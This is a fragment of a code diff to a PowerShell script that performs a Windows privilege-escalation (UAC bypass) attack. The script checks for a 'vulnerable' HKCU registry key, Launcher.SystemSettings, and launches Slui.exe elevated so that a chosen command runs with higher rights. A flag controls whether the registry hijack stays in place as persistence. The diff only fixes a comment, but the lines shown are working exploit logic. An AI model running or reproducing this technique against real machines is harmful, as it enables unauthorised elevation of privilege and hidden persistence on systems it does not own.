@@ -69,7 +69,6 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
-
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
 If($CheckVuln -eq $True){
@@ -123,7 +122,7 @@ If($CheckVuln -eq $True){
    Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
-   ## If $MakeItPersistence is set to "False" then the EOP registry hacks will NOT
+   ## If $MakeItPersistence is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
